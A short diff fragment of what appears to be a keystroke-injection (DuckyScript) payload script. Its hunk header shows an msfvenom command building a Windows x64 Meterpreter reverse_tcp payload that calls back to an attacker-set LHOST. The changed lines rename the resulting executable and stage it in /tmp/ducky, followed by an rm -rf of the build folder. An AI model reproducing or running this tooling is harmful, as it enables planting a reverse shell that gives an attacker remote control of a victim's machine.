@@ -18,7 +18,7 @@ STRINGLN ./build.sh (msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LOCA
 WAIT_FOR_BUTTON_PRESS
 
 REM Move things around
-STRINGLN mv ./t.exe /tmp/ducky/windows.exe
+STRINGLN mv ./flipping_duckling.exe /tmp/ducky/windows
 STRINGLN cd /tmp/ducky/
 STRINGLN rm -rf flipping_duckling/
 
